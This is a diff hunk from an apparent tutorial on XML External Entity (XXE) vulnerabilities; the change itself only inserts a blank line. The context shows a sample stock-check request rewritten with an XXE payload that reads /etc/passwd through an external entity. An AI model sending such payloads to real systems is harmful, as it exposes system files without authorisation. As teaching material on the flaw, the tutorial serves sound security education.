@@ -10,6 +10,7 @@ For example, an application checks the stock level of a product by submitting th
 An attacker can exploit the XXE vulnerability by modifying the XML to include the XXE payload:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
+
 <!DOCTYPE haxxor [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
